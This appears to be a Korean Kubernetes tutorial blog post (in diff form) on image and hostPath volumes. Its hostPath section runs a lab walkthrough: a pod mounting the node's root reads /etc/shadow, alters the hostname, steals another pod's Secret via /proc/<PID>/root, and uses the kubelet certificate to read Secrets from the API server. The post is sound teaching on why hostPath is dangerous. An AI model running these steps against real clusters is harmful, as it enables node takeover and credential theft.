+    <span class="na">image</span><span class="pi">:</span> <span class="s">luksa/quiz-api:0.1</span>
+    <span class="na">imagePullPolicy</span><span class="pi">:</span> <span class="s">IfNotPresent</span>
+    <span class="na">ports</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">http</span>
+      <span class="na">containerPort</span><span class="pi">:</span> <span class="s">8080</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">mongo</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">mongo:7</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">quiz-data</span>
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/data/db</span>
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">initdb</span>
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/docker-entrypoint-initdb.d/</span>
+      <span class="na">readOnly</span><span class="pi">:</span> <span class="no">true</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">luksa/quiz-questions:latest</code> 이미지 안의 파일들이 그대로 볼륨이 되어, mongo 컨테이너의 <code class="highlighter-rouge">/docker-entrypoint-initdb.d/</code>에 마운트된다. MongoDB는 시작 시 해당 디렉토리의 스크립트를 자동 실행하여 데이터를 초기화한다.</p>
+
+<h2 id="새-pod-실행-및-검사">새 Pod 실행 및 검사</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> pod.quiz.imagevolume.yaml
+
+<span class="c"># 실행 결과</span>
+pod/quiz created
+
+kubectl get po
+
+<span class="c"># 실행 결과</span>
+NAME   READY   STATUS              RESTARTS   AGE
+quiz   0/2     ContainerCreating   0          3s
+</code></pre></div></div>
+
+<p>Pod 볼륨은 Pod의 모든 컨테이너가 시작되기 전에 생성된다. <code class="highlighter-rouge">kubectl describe</code>로 이벤트를 확인하면, kubelet이 <code class="highlighter-rouge">luksa/quiz-questions:latest</code> 이미지를 먼저 pull한 것을 볼 수 있다.</p>
+
+<details>
+  <summary>kubectl describe pod quiz 이벤트</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl describe pod quiz
+
+<span class="c"># 실행 결과 (Events 부분)</span>
+Events:
+  Type    Reason     Age                From               Message
+  <span class="nt">----</span>    <span class="nt">------</span>     <span class="nt">----</span>               <span class="nt">----</span>               <span class="nt">-------</span>
+  Normal  Scheduled  72s                default-scheduler  Successfully assigned default/quiz to kind-worker2
+  Normal  Pulled     68s                kubelet            Successfully pulled image <span class="s2">"luksa/quiz-questions:latest"</span> <span class="k">in </span>4.294s <span class="o">(</span>4.294s including waiting<span class="o">)</span><span class="nb">.</span> Image size: 1816 bytes.
+  Normal  Pulling    68s                kubelet            spec.containers<span class="o">{</span>quiz-api<span class="o">}</span>: Pulling image <span class="s2">"luksa/quiz-api:0.1"</span>
+  Normal  Created    64s                kubelet            spec.containers<span class="o">{</span>quiz-api<span class="o">}</span>: Container created
+  Normal  Pulled     64s                kubelet            spec.containers<span class="o">{</span>quiz-api<span class="o">}</span>: Successfully pulled image <span class="s2">"luksa/quiz-api:0.1"</span> <span class="k">in </span>3.963s <span class="o">(</span>3.963s including waiting<span class="o">)</span><span class="nb">.</span> Image size: 10468990 bytes.
+  Normal  Started    63s                kubelet            spec.containers<span class="o">{</span>quiz-api<span class="o">}</span>: Container started
+  Normal  Pulling    63s                kubelet            spec.containers<span class="o">{</span>mongo<span class="o">}</span>: Pulling image <span class="s2">"mongo:7"</span>
+  Normal  Pulled     34s                kubelet            spec.containers<span class="o">{</span>mongo<span class="o">}</span>: Successfully pulled image <span class="s2">"mongo:7"</span> <span class="k">in </span>29.751s <span class="o">(</span>29.751s including waiting<span class="o">)</span><span class="nb">.</span> Image size: 279839461 bytes.
+  Normal  Created    34s                kubelet            spec.containers<span class="o">{</span>mongo<span class="o">}</span>: Container created
+  Normal  Started    34s                kubelet            spec.containers<span class="o">{</span>mongo<span class="o">}</span>: Container started
+</code></pre></div>  </div>
+
+</details>
+
+<p>mongo 컨테이너에서 파일이 제대로 마운트되었는지 확인한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> quiz <span class="nt">-c</span> mongo <span class="nt">--</span> <span class="nb">ls</span> <span class="nt">-la</span> /docker-entrypoint-initdb.d/
+
+<span class="c"># 실행 결과</span>
+total 12
+drwxr-xr-x 1 root root 4096 Apr  1 16:50 <span class="nb">.</span>
+drwxr-xr-x 1 root root 4096 Apr  1 16:50 ..
+<span class="nt">-rw-rw-r--</span> 1 root root 2361 Mar 14  2022 insert-questions.js
+</code></pre></div></div>
+
+<p>Quiz API를 통해 데이터가 정상적으로 초기화되었는지도 확인할 수 있다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl port-forward pod/quiz 8080:8080
+
+<span class="c"># 실행 결과</span>
+Forwarding from 127.0.0.1:8080 -&gt; 8080
+Forwarding from <span class="o">[</span>::1]:8080 -&gt; 8080
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl localhost:8080/questions/random
+
+<span class="c"># 실행 결과</span>
+<span class="o">{</span><span class="s2">"id"</span>:6,<span class="s2">"text"</span>:<span class="s2">"Which of the following statements is correct?"</span>,<span class="s2">"correctAnswerIndex"</span>:1,<span class="s2">"answers"</span>:[<span class="s2">"When the readiness probe fails, the container is restarted."</span>,<span class="s2">"When the liveness probe fails, the container is restarted."</span>,<span class="s2">"Containers without a readiness probe are never restarted."</span>,<span class="s2">"Containers without a liveness probe are never restarted."</span><span class="o">]}</span>
+</code></pre></div></div>
+
+<p>MongoDB가 시작 시 <code class="highlighter-rouge">insert-questions.js</code> 파일을 실행했으므로, 문제들이 데이터베이스에 정상적으로 저장되어 있다.</p>
+
+<h2 id="향후-전망-oci-artifacts와-oras">향후 전망: OCI Artifacts와 ORAS</h2>
+
+<p>현재 <code class="highlighter-rouge">image</code> 볼륨은 Dockerfile로 빌드한 컨테이너 이미지만 지원한다. 하지만 OCI 스펙에는 <strong>OCI Artifacts</strong>라는 개념이 있어, 컨테이너 이미지뿐 아니라 임의의 파일 번들을 레지스트리에 저장할 수 있다. <a href="https://oras.land/">ORAS(OCI Registry As Storage)</a> CLI를 사용하면 Dockerfile 없이 <code class="highlighter-rouge">oras push</code>로 파일을 직접 레지스트리에 올릴 수 있다.</p>
+
+<p>향후 <code class="highlighter-rouge">image</code> 볼륨이 OCI Artifacts를 지원하게 되면, Dockerfile 빌드 과정 없이 설정 파일이나 모델 가중치를 레지스트리에 push하고 볼륨으로 마운트하는 워크플로우가 가능해진다.</p>
+
+<p><br /></p>
+
+<h1 id="hostpath-볼륨">hostPath 볼륨</h1>
+
+<h2 id="노드와-pod의-경계를-넘는-볼륨">노드와 Pod의 경계를 넘는 볼륨</h2>
+
+<p>Kubernetes의 핵심 추상화는 워크로드를 노드에서 격리하는 것이다. Pod는 어떤 노드에서 실행되는지 몰라야 하고, 노드 교체/추가에도 영향받지 않아야 한다. <code class="highlighter-rouge">hostPath</code>는 이 추상화를 <strong>의도적으로 깨뜨리는</strong> 볼륨 타입이다. 노드의 파일시스템을 Pod에 직접 노출하므로, 사용 시 보안과 이식성 모두를 신중하게 따져야 한다.</p>
+
+<p>대부분의 Pod는 자신이 어떤 호스트 노드에서 실행되고 있는지 몰라야 하고, 노드의 파일 시스템에 있는 어떠한 파일에도 접근해서는 안 된다. <code class="highlighter-rouge">hostPath</code>는 이 원칙의 예외로, 호스트 노드의 파일시스템을 Pod에 직접 마운트한다. 공식 문서도 <strong>보안 위험을 수반하며, 가능하면 사용을 피하라</strong>고 명시하고 있다. (<a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath">Kubernetes 공식 문서: hostPath</a>) 다만 시스템 레벨의 Pod(DaemonSet 등)는 예외로, 이들은 노드의 파일을 읽거나 파일 시스템을 통해 노드 장치 등의 컴포넌트에 접근해야 할 필요가 있다. Kubernetes는 이를 위해 <code class="highlighter-rouge">hostPath</code> 볼륨 타입을 제공한다.</p>
+
+<h2 id="hostpath-소개">hostPath 소개</h2>
+
+<p><code class="highlighter-rouge">hostPath</code> 볼륨은 <strong>노드의 파일 시스템 경로를 Pod에 마운트</strong>하는 범용 볼륨 타입으로, 호스트 노드의 파일 시스템에 있는 특정 파일이나 디렉터리를 가리킨다. 같은 노드에서 실행되고 같은 <code class="highlighter-rouge">hostPath</code> 경로를 사용하는 Pod들은 동일한 파일에 접근할 수 있지만, <strong>다른 노드의 Pod는 접근할 수 없다.</strong></p>
+
+<p><img src="https://sirzzang.github.io//assets/images/k8s-vol-03-hostpath-volume.png" alt="hostPath 볼륨 다이어그램" class="align-center" /></p>
+
+<p><code class="highlighter-rouge">hostPath</code> 볼륨은 해당 Pod가 항상 같은 노드에서 실행되도록 보장하지 않는 한, Pod의 데이터를 저장하기에 적합하지 않다.</p>
+
+<ul>
+  <li>볼륨의 내용이 특정 노드의 파일 시스템에 저장되기 때문에, Pod가 다른 노드로 재스케줄링되면 데이터에 접근할 수 없다</li>
+  <li>일반적으로 <code class="highlighter-rouge">hostPath</code> 볼륨은 Pod가 노드의 파일 시스템에서 프로세스가 생성하거나 읽는 파일(예: 시스템 로그)에 접근해야 하는 경우에 사용된다</li>
+</ul>
+
+<h3 id="위험성-경고">위험성 경고</h3>
+
+<p><code class="highlighter-rouge">hostPath</code>는 <strong>Kubernetes에서 가장 위험한 볼륨 타입 중 하나</strong>이며, 보통 privileged Pod에서만 사용해야 한다. <code class="highlighter-rouge">hostPath</code>의 무제한 사용을 허용하면, 클러스터 사용자가 노드에서 원하는 모든 작업을 수행할 수 있다. 예를 들어, Docker 소켓 파일(일반적으로 <code class="highlighter-rouge">/var/run/docker.sock</code>)을 컨테이너에 마운트하고, 컨테이너 내부에서 Docker 클라이언트를 실행하여 호스트 노드에서 root 사용자로 임의의 명령을 실행할 수 있다.</p>
+
+<p>실제 사용 맥락을 보면:</p>
+
+<ul>
+  <li><strong>시스템 레벨 Pod</strong>(DaemonSet 등)에서 가장 많이 쓰인다. 예: 로그 수집기(Fluentd, Filebeat)가 <code class="highlighter-rouge">/var/log</code>를 읽거나, 모니터링 에이전트가 <code class="highlighter-rouge">/sys</code>, <code class="highlighter-rouge">/proc</code>에 접근하는 경우</li>
+  <li><strong>일반 워크로드에서도 사용 가능</strong>하지만 권장되지 않는다. Pod가 특정 노드에 종속되어 이식성이 떨어지고, 보안 위험이 크다</li>
+  <li>일반 애플리케이션에는 PV/PVC 같은 추상화된 스토리지를 사용하는 것이 바람직하다</li>
+</ul>
+
+<h2 id="hostpath-사용-예제-node-explorer-pod">hostPath 사용 예제: node-explorer Pod</h2>
+
+<p><code class="highlighter-rouge">hostPath</code> 볼륨이 얼마나 위험한지 실증하기 위해, Pod 내부에서 호스트 노드의 전체 파일 시스템을 탐색할 수 있는 Pod를 배포한다. 볼륨은 노드 파일 시스템의 루트 디렉터리(<code class="highlighter-rouge">/</code>)를 가리키며, Pod가 스케줄링된 노드의 전체 파일 시스템에 접근할 수 있게 한다.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">kubectl apply -f - &lt;&lt;EOF</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">node-explorer</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="c1"># 노드의 루트 파일시스템(/)을 볼륨으로 정의</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">host-root</span>
+    <span class="na">hostPath</span><span class="pi">:</span>
+      <span class="na">path</span><span class="pi">:</span> <span class="s">/</span>          <span class="c1"># 노드의 / (루트) 전체를 볼륨 소스로 지정</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">node-explorer</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">alpine</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">sleep"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">infinity"</span><span class="pi">]</span>   <span class="c1"># 컨테이너를 종료 없이 유지 (탐색용)</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">host-root</span>
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/host</span>   <span class="c1"># 노드의 /가 컨테이너의 /host에 마운트됨</span>
+                         <span class="c1"># → /host/etc = 노드의 /etc</span>
+                         <span class="c1"># → /host/var/log = 노드의 /var/log 등</span>
+<span class="s">EOF</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get po
+
+<span class="c"># 실행 결과</span>
+NAME            READY   STATUS    RESTARTS   AGE
+node-explorer   1/1     Running   0          59s
+</code></pre></div></div>
+
+<p>컨테이너와 셸 명령이 root로 실행되고 있으므로 워커 노드의 모든 파일을 수정할 수 있다.</p>
+
+<blockquote>
+  <p><strong>Note:</strong> 클러스터에 워커 노드가 여러 개인 경우, Pod는 임의의 노드에 스케줄링된다. 특정 노드에 배포하려면 <code class="highlighter-rouge">.spec.nodeName</code> 필드를 해당 노드 이름으로 설정하면 된다.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nb">exec</span> <span class="nt">-it</span> node-explorer <span class="nt">--</span> sh
+
+<span class="c"># Pod 안에서 호스트 파일시스템 탐색</span>
+/ <span class="c"># ls -al /host</span>
+
+<span class="c"># 실행 결과</span>
+total 64
+drwxr-xr-x    1 root     root          4096 Apr  1 16:34 <span class="nb">.</span>
+drwxr-xr-x    1 root     root          4096 Apr  2 01:12 ..
+<span class="nt">-rwxr-xr-x</span>    1 root     root             0 Apr  1 16:34 .dockerenv
+drw-r--r--   99 root     root          4096 Dec 15 23:24 LICENSES
+lrwxrwxrwx    1 root     root             7 Dec  8 00:00 bin -&gt; usr/bin
+drwxr-xr-x    2 root     root          4096 Aug 24  2025 boot
+drwxr-xr-x   10 root     root          3440 Apr  1 16:34 dev
+drwxr-xr-x    1 root     root          4096 Apr  1 16:34 etc
+...
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">/host</code> 아래에 워커 노드의 전체 파일 시스템이 그대로 보인다. 실제로 공격자가 Kubernetes API에 접근하여 이 유형의 Pod를 프로덕션 클러스터에 배포할 수 있다. Kubernetes는 기본적으로 일반 사용자가 <code class="highlighter-rouge">hostPath</code> 볼륨을 사용하는 것을 막지 않는다.</p>
+
+<h2 id="hostpath-위험성-체감">hostPath 위험성 체감</h2>
+
+<p><code class="highlighter-rouge">hostPath: /</code>는 노드의 root 접근 권한과 동일하므로 매우 위험한 볼륨이다. 프로덕션 환경에서는 PodSecurityAdmission의 <code class="highlighter-rouge">restricted</code> 프로파일로 hostPath 사용을 반드시 차단해야 한다. 아래 시나리오들을 통해 위험성을 직접 체감해 보자.</p>
+
+<h3 id="사전-준비">사전 준비</h3>
+
+<p><code class="highlighter-rouge">node-explorer</code> Pod를 배포한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># node-explorer 배포</span>
+<span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="sh">'</span><span class="no">YAML</span><span class="sh">' | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: node-explorer
+spec:
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+  containers:
+  - name: node-explorer
+    image: alpine
+    command: ["sleep", "infinity"]
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+</span><span class="no">YAML
+
+</span><span class="c"># 실행 결과</span>
+pod/node-explorer created
+
+<span class="c"># Pod 확인</span>
+kubectl get pod node-explorer <span class="nt">-o</span> wide
+
+<span class="c"># 실행 결과</span>
+NAME            READY   STATUS    RESTARTS   AGE   IP           NODE          NOMINATED NODE   READINESS GATES
+node-explorer   1/1     Running   0          17m   10.244.1.2   kind-worker   &lt;none&gt;           &lt;none&gt;
+</code></pre></div></div>
+
+<h3 id="노드-os-레벨-설정-조회조작">노드 OS 레벨 설정 조회/조작</h3>
+
+<p>컨테이너 안에서 노드의 OS 레벨 설정을 직접 조회하고 조작할 수 있다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Pod 안에서 호스트의 /etc/shadow 읽기 (패스워드 해시)</span>
+/ <span class="c"># cat /host/etc/shadow</span>
+
+<span class="c"># 실행 결과</span>
+root:<span class="k">*</span>::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+...
+
+<span class="c"># 호스트의 /etc/hostname 변경</span>
+/ <span class="c"># echo "hacked-node" &gt; /host/etc/hostname</span>
+</code></pre></div></div>
+
+<h3 id="다른-pod의-secret-탈취">다른 Pod의 Secret 탈취</h3>
+
+<p>kubelet이 마운트한 시크릿은 호스트 파일시스템에 있으므로, 같은 노드의 다른 Pod에 마운트된 Secret까지 읽을 수 있다.</p>
+
+<p>먼저 시크릿을 생성하고, 그 시크릿을 사용하는 <code class="highlighter-rouge">victim-app</code> Pod를 같은 노드에 배치한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 시크릿 생성</span>
+kubectl create secret generic super-secret <span class="se">\</span>
+  <span class="nt">--from-literal</span><span class="o">=</span><span class="nv">password</span><span class="o">=</span><span class="s1">'S3cr3tP@ssw0rd!'</span> <span class="se">\</span>
+  <span class="nt">--from-literal</span><span class="o">=</span>api-key<span class="o">=</span><span class="s1">'sk-1234567890abcdef'</span>
+
+<span class="c"># 실행 결과</span>
+secret/super-secret created
+</code></pre></div></div>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 시크릿 사용 Pod(victim-app) 생성: node-explorer와 같은 노드에 배치</span>
+<span class="s">cat &lt;&lt;'YAML' | kubectl apply -f -</span>
+<span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">victim-app</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">nodeName</span><span class="pi">:</span> <span class="s">kind-worker</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">secret-vol</span>
+    <span class="na">secret</span><span class="pi">:</span>
+      <span class="na">secretName</span><span class="pi">:</span> <span class="s">super-secret</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">app</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="s">alpine</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">sleep"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">infinity"</span><span class="pi">]</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">secret-vol</span>
+      <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/etc/secrets</span>
+      <span class="na">readOnly</span><span class="pi">:</span> <span class="no">true</span>
+<span class="s">YAML</span>
+</code></pre></div></div>
+
+<p>Secret은 tmpfs로 컨테이너의 mount namespace 안에만 마운트되기 때문에, 호스트 경로에서 직접 읽으면 비어 있다. 하지만 <code class="highlighter-rouge">/proc/&lt;PID&gt;/root/</code>를 통하면 해당 프로세스의 mount namespace를 따라가므로, tmpfs 위의 Secret 파일까지 그대로 읽을 수 있다.</p>
+
+<details>
+  <summary>Secret 탈취 전체 과정</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubelet 디렉토리에서 secret 디렉토리 탐색</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+find /host/var/lib/kubelet/pods -type d -name "kubernetes.io~secret" 2&gt;/dev/null'</span>
+
+<span class="c"># 실행 결과</span>
+/host/var/lib/kubelet/pods/3e004f64-5bba-4e97-b32b-8a8dcaa45f2e/volumes/kubernetes.io~secret
+
+<span class="c"># 직접 읽기 시도: 실패 → tmpfs 마운트이므로 비어 있음</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+POD=3e004f64-5bba-4e97-b32b-8a8dcaa45f2e
+ls -la /host/var/lib/kubelet/pods/$POD/volumes/kubernetes.io~secret/secret-vol/'</span>
+
+<span class="c"># 실행 결과</span>
+total 8
+drwxrwxrwx    2 root     root          4096 Apr  2 02:23 <span class="nb">.</span>
+drwxr-xr-x    3 root     root          4096 Apr  2 02:23 ..
+
+<span class="c"># /proc를 통한 우회: victim-app의 PID 찾기</span>
+<span class="c"># cgroup에 victim-app의 Pod UID가 포함된 PID가 타겟</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+for pid in /host/proc/[0-9]*; do
+  cmdline=$(cat "$pid/cmdline" 2&gt;/dev/null | tr "\0" " ")
+  if echo "$cmdline" | grep -q "sleep infinity" 2&gt;/dev/null; then
+    p=$(basename $pid)
+    cg=$(cat "$pid/cgroup" 2&gt;/dev/null)
+    echo "PID=$p  cmd=$cmdline"
+    echo "  cgroup: $cg"
+    echo ""
+  fi
+done'</span>
+
+<span class="c"># 실행 결과</span>
+<span class="nv">PID</span><span class="o">=</span>4117  <span class="nv">cmd</span><span class="o">=</span>sleep infinity
+  cgroup: 0::/
+
+<span class="nv">PID</span><span class="o">=</span>6082  <span class="nv">cmd</span><span class="o">=</span>sleep infinity
+  cgroup: 0::/../../kubelet-kubepods-besteffort-pod3e004f64_5bba_4e97_b32b_8a8dcaa45f2e.slice/cri-containerd-07cd41db...scope
+
+<span class="c"># /proc/PID/root를 통한 Secret 탈취!</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+VICTIM_PID=6082
+
+echo "=== /proc/PID/root 를 통해 Secret 경로 확인 ==="
+ls -la /host/proc/$VICTIM_PID/root/etc/secrets/
+echo ""
+echo "=== Secret 탈취! ==="
+echo -n "password: "; cat /host/proc/$VICTIM_PID/root/etc/secrets/password
+echo ""
+echo -n "api-key:  "; cat /host/proc/$VICTIM_PID/root/etc/secrets/api-key'</span>
+
+<span class="c"># 실행 결과</span>
+<span class="o">===</span> /proc/PID/root 를 통해 Secret 경로 확인 <span class="o">===</span>
+total 4
+drwxrwxrwt    3 root     root           120 Apr  2 02:23 <span class="nb">.</span>
+drwxr-xr-x    1 root     root          4096 Apr  2 02:23 ..
+drwxr-xr-x    2 root     root            80 Apr  2 02:23 ..2026_04_02_02_23_05.3427574610
+lrwxrwxrwx    1 root     root            32 Apr  2 02:23 ..data -&gt; ..2026_04_02_02_23_05.3427574610
+lrwxrwxrwx    1 root     root            14 Apr  2 02:23 api-key -&gt; ..data/api-key
+lrwxrwxrwx    1 root     root            15 Apr  2 02:23 password -&gt; ..data/password
+
+<span class="o">===</span> Secret 탈취! <span class="o">===</span>
+password: S3cr3tP@ssw0rd!
+api-key:  sk-1234567890abcdef
+</code></pre></div>  </div>
+
+</details>
+
+<p>핵심은, <code class="highlighter-rouge">/proc/&lt;PID&gt;/root/</code>가 해당 프로세스의 mount namespace를 따라가므로, tmpfs 위의 Secret 파일까지 그대로 읽을 수 있다는 것이다. <code class="highlighter-rouge">hostPath: /</code>만 있으면 같은 노드의 <strong>모든 Pod의 Secret</strong>을 탈취할 수 있다.</p>
+
+<h3 id="kubelet-인증서로-api-서버-접근">kubelet 인증서로 API 서버 접근</h3>
+
+<p>kubelet의 kubeconfig를 탈취하면 API 서버에 <code class="highlighter-rouge">system:node</code> 권한으로 요청을 보낼 수 있다.</p>
+
+<details>
+  <summary>kubelet 인증서 탈취 및 API 서버 접근 전체 과정</summary>
+
+  <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubelet kubeconfig 탈취</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> <span class="nb">cat</span> /host/etc/kubernetes/kubelet.conf
+
+<span class="c"># 실행 결과</span>
+apiVersion: v1
+clusters:
+- cluster:
+    certificate-authority-data: LS0tLS1CRUdJTi...
+    server: https://kind-control-plane:6443
+  name: default-cluster
+contexts:
+- context:
+    cluster: default-cluster
+    namespace: default
+    user: default-auth
+  name: default-context
+current-context: default-context
+kind: Config
+users:
+- name: default-auth
+  user:
+    client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
+    client-key: /var/lib/kubelet/pki/kubelet-client-current.pem
+
+<span class="c"># kubelet 인증서 파일 확인</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> <span class="nb">ls</span> <span class="nt">-la</span> /host/var/lib/kubelet/pki/
+
+<span class="c"># 실행 결과</span>
+total 20
+drwxr-xr-x    2 root     root          4096 Apr  1 16:35 <span class="nb">.</span>
+drwx------   10 root     root          4096 Apr  2 01:31 ..
+<span class="nt">-rw-------</span>    1 root     root          1118 Apr  1 16:35 kubelet-client-2026-04-01-16-35-11.pem
+lrwxrwxrwx    1 root     root            59 Apr  1 16:35 kubelet-client-current.pem -&gt; /var/lib/kubelet/pki/kubelet-client-2026-04-01-16-35-11.pem
+<span class="nt">-rw-r--r--</span>    1 root     root          2291 Apr  1 16:35 kubelet.crt
+<span class="nt">-rw-------</span>    1 root     root          1679 Apr  1 16:35 kubelet.key
+
+<span class="c"># 인증서를 사용하여 API 서버에 접근 시도</span>
+<span class="c"># system:node:kind-worker로 인증되지만, 일반 Pod 목록 조회는 거부됨</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+cp /host/var/lib/kubelet/pki/kubelet-client-2026-04-01-16-35-11.pem /tmp/kubelet-client.pem
+cp /host/etc/kubernetes/pki/ca.crt /tmp/ca.crt
+
+curl -sk --connect-timeout 5 \
+  --cert /tmp/kubelet-client.pem \
+  --key /tmp/kubelet-client.pem \
+  --cacert /tmp/ca.crt \
+  --resolve "kind-control-plane:6443:172.18.0.2" \
+  "https://kind-control-plane:6443/api/v1/namespaces/default/pods?limit=3"'</span>
+
+<span class="c"># 실행 결과</span>
+<span class="o">{</span>
+  <span class="s2">"kind"</span>: <span class="s2">"Status"</span>,
+  <span class="s2">"apiVersion"</span>: <span class="s2">"v1"</span>,
+  <span class="s2">"metadata"</span>: <span class="o">{}</span>,
+  <span class="s2">"status"</span>: <span class="s2">"Failure"</span>,
+  <span class="s2">"message"</span>: <span class="s2">"pods is forbidden: User </span><span class="se">\"</span><span class="s2">system:node:kind-worker</span><span class="se">\"</span><span class="s2"> cannot list resource </span><span class="se">\"</span><span class="s2">pods</span><span class="se">\"</span><span class="s2"> in API group </span><span class="se">\"\"</span><span class="s2"> in the namespace </span><span class="se">\"</span><span class="s2">default</span><span class="se">\"</span><span class="s2">: can only list/watch pods with spec.nodeName field selector"</span>,
+  <span class="s2">"reason"</span>: <span class="s2">"Forbidden"</span>,
+  <span class="s2">"code"</span>: 403
+<span class="o">}</span>
+
+<span class="c"># 자기 노드의 Pod 조회 (성공!)</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+curl -sk --connect-timeout 5 \
+  --cert /tmp/kubelet-client.pem \
+  --key /tmp/kubelet-client.pem \
+  --cacert /tmp/ca.crt \
+  --resolve "kind-control-plane:6443:172.18.0.2" \
+  "https://kind-control-plane:6443/api/v1/pods?fieldSelector=spec.nodeName%3Dkind-worker&amp;limit=5"'</span> <span class="se">\</span>
+  | <span class="nb">grep</span> <span class="s1">'"name"'</span> | head <span class="nt">-5</span>
+
+<span class="c"># 실행 결과</span>
+            <span class="s2">"name"</span>: <span class="s2">"node-explorer"</span>,
+                <span class="s2">"name"</span>: <span class="s2">"host-root"</span>,
+                <span class="s2">"name"</span>: <span class="s2">"kube-api-access-6rzt9"</span>,
+                        <span class="s2">"name"</span>: <span class="s2">"kube-root-ca.crt"</span>,
+                <span class="s2">"name"</span>: <span class="s2">"node-explorer"</span>,
+
+<span class="c"># Secret 직접 조회: 성공!</span>
+<span class="c"># kubelet은 자기 노드의 Pod가 참조하는 Secret을 읽을 수 있음</span>
+kubectl <span class="nb">exec </span>node-explorer <span class="nt">--</span> sh <span class="nt">-c</span> <span class="s1">'
+curl -sk --connect-timeout 5 \
+  --cert /tmp/kubelet-client.pem \
+  --key /tmp/kubelet-client.pem \
+  --cacert /tmp/ca.crt \
+  --resolve "kind-control-plane:6443:172.18.0.2" \
+  "https://kind-control-plane:6443/api/v1/namespaces/default/secrets/super-secret"'</span> | head <span class="nt">-15</span>
+
+<span class="c"># 실행 결과</span>
+<span class="o">{</span>
+  <span class="s2">"kind"</span>: <span class="s2">"Secret"</span>,
+  <span class="s2">"apiVersion"</span>: <span class="s2">"v1"</span>,
+  <span class="s2">"metadata"</span>: <span class="o">{</span>
